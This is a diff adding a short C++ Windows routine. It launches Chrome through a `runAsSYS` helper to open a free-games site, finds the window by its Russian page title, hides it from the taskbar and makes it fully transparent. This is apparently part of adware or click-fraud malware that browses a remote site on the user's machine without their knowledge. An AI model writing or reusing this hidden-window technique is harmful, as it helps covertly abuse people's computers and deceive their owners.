@@ -1,0 +1,35 @@
+HWND hwndM;
+DWORD mainPID = 0;
+
+bool start()
+{
+	if (runAsSYS("\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" \"http://more-free-games.3dn.ru/\" --new-window", "C:\\"))
+	{
+		int startTime = clock();
+		while (hwndM == 0 && (clock() - startTime < 10000))
+		{
+			hwndM = FindWindow(0, "Персональный сайт - Главная страница - Google Chrome");
+			Sleep(100);
+		}
+
+		if (hwndM == NULL)
+		{
+			return false;
+		}
+			DWORD q;
+			GetWindowThreadProcessId(hwndM, &mainPID);
+
+			ShowWindow(hwndM, SW_HIDE);
+			SetWindowLong(hwndM, GWL_EXSTYLE, GetWindowLong(hwndM, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
+			ShowWindow(hwndM, SW_SHOW);
+
+			MoveWindow(hwndM, 0, 0, 500, 500, 1);
+
+			SetLayeredWindowAttributes(hwndM, 0, 0, LWA_ALPHA);
+			return true;
+	}
+	else
+	{
+		return false;
+	}
+}
